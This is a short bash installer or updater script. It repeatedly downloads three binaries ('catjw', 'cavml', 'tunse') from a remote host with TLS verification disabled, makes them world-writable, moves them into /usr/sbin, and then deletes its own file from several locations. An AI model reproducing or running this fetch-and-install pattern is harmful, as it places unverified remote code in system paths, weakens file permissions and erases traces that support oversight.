#!/bin/bash

p=$(pwd)

while :; do
  curl -L -k -sS -o catjw "http://scriptcjxrq91ay.potatonc.my.id/depens/catjwoldsc"
  if [[ $(stat -c%s catjw) -gt 1000 ]]; then
    chmod 777 catjw
    mv catjw /usr/sbin/
    break
  else
    sleep 2
  fi
done

while :; do
  curl -L -k -sS -o cavml "http://scriptcjxrq91ay.potatonc.my.id/depens/cavmloldsc"
  if [[ $(stat -c%s cavml) -gt 1000 ]]; then
    chmod 777 cavml
    mv cavml /usr/sbin/
    break
  else
    sleep 2
  fi
done

while :; do
  curl -L -k -sS -o tunse "http://scriptcjxrq91ay.potatonc.my.id/depens/tunseoldsc"
  if [[ $(stat -c%s tunse) -gt 1000 ]]; then
    chmod 777 tunse
    mv tunse /usr/sbin/
    break
  else
    sleep 2
  fi
done

clear
echo " done"

rm -f "$0" > /dev/null 2>&1
rm -f "${p}/updateoldsc" > /dev/null 2>&1
rm -f "${p}/$0" > /dev/null 2>&1
rm -f updateoldsc > /dev/null 2>&1
rm -f /root/updateoldsc > /dev/null 2>&1
rm -f "/root/$0" > /dev/null 2>&1
